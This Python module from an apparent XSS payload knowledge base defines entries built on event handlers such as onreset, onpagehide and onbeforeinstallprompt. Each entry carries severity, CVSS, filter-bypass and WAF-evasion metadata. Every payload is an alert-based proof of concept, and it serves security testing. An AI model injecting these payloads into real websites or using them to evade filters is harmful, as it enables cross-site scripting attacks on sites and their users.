#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Truly Last XSS Payloads - Part 3
Form events, Input events, Security policy events, Print events, Page lifecycle, Language/Direction events, Device orientation/motion, and App install events.
"""

from ..models import PayloadEntry


BRS_KB_TRULY_LAST_PAYLOADS_PART3 = {
    # ============================================================
    # FORM EVENTS (MORE)
    # ============================================================
    "form-onreset": PayloadEntry(
        payload='<form onreset="alert(1)"><input type="reset"></form>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Form reset event",
        tags=["form", "reset"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "form-onformdata": PayloadEntry(
        payload='<form onformdata="alert(1)"><input type="submit"></form>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Form data event (new)",
        tags=["form", "formdata"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari"],
        reliability="high",
    ),
    # ============================================================
    # INPUT EVENTS (MORE)
    # ============================================================
    "input-onselect": PayloadEntry(
        payload='<input onselect="alert(1)" value="select me">',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Input select event",
        tags=["input", "select"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "input-onselectionchange": PayloadEntry(
        payload="document.onselectionchange=()=>alert(1)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Selection change event",
        tags=["input", "selectionchange"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "input-onselectstart": PayloadEntry(
        payload="document.onselectstart=()=>alert(1)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Selection start event",
        tags=["input", "selectstart"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # SECURITY POLICY EVENTS
    # ============================================================
    "csp-onsecuritypolicyviolation": PayloadEntry(
        payload="document.onsecuritypolicyviolation=e=>alert(e.violatedDirective)",
        contexts=["javascript"],
        severity="medium",
        cvss_score=6.0,
        description="CSP violation event",
        tags=["csp", "violation"],
        bypasses=["csp_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    # ============================================================
    # PRINT EVENTS
    # ============================================================
    "print-onbeforeprint": PayloadEntry(
        payload="onbeforeprint=()=>alert(1)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Before print event",
        tags=["print", "before"],
        bypasses=["print_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    "print-onafterprint": PayloadEntry(
        payload="onafterprint=()=>alert(1)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="After print event",
        tags=["print", "after"],
        bypasses=["print_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    # ============================================================
    # PAGE LIFECYCLE
    # ============================================================
    "lifecycle-onpageshow": PayloadEntry(
        payload="onpageshow=()=>alert(1)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Page show event",
        tags=["lifecycle", "pageshow"],
        bypasses=["lifecycle_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "lifecycle-onpagehide": PayloadEntry(
        payload="onpagehide=()=>alert(1)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Page hide event",
        tags=["lifecycle", "pagehide"],
        bypasses=["lifecycle_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "lifecycle-onbeforeunload": PayloadEntry(
        payload="onbeforeunload=()=>alert(1)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Before unload event",
        tags=["lifecycle", "beforeunload"],
        bypasses=["lifecycle_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "lifecycle-onunload": PayloadEntry(
        payload="onunload=()=>alert(1)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Unload event",
        tags=["lifecycle", "unload"],
        bypasses=["lifecycle_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # LANGUAGE/DIRECTION EVENTS
    # ============================================================
    "lang-onlanguagechange": PayloadEntry(
        payload="onlanguagechange=()=>alert(1)",
        contexts=["javascript"],
        severity="medium",
        cvss_score=6.0,
        description="Language change event",
        tags=["language", "change"],
        bypasses=["lang_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    # ============================================================
    # DEVICE ORIENTATION/MOTION
    # ============================================================
    "device-ondeviceorientation": PayloadEntry(
        payload="ondeviceorientation=()=>alert(1)",
        contexts=["javascript"],
        severity="medium",
        cvss_score=6.0,
        description="Device orientation event",
        tags=["device", "orientation"],
        bypasses=["device_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari"],
        reliability="low",
    ),
    "device-ondevicemotion": PayloadEntry(
        payload="ondevicemotion=()=>alert(1)",
        contexts=["javascript"],
        severity="medium",
        cvss_score=6.0,
        description="Device motion event",
        tags=["device", "motion"],
        bypasses=["device_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari"],
        reliability="low",
    ),
    # ============================================================
    # APP INSTALL
    # ============================================================
    "app-onappinstalled": PayloadEntry(
        payload="onappinstalled=()=>alert(1)",
        contexts=["javascript"],
        severity="medium",
        cvss_score=6.0,
        description="App installed event (PWA)",
        tags=["app", "installed"],
        bypasses=["app_filters"],
        waf_evasion=True,
        browser_support=["chrome", "edge"],
        reliability="low",
    ),
    "app-onbeforeinstallprompt": PayloadEntry(
        payload="onbeforeinstallprompt=()=>alert(1)",
        contexts=["javascript"],
        severity="medium",
        cvss_score=6.0,
        description="Before install prompt (PWA)",
        tags=["app", "installprompt"],
        bypasses=["app_filters"],
        waf_evasion=True,
        browser_support=["chrome", "edge"],
        reliability="low",
    ),
}
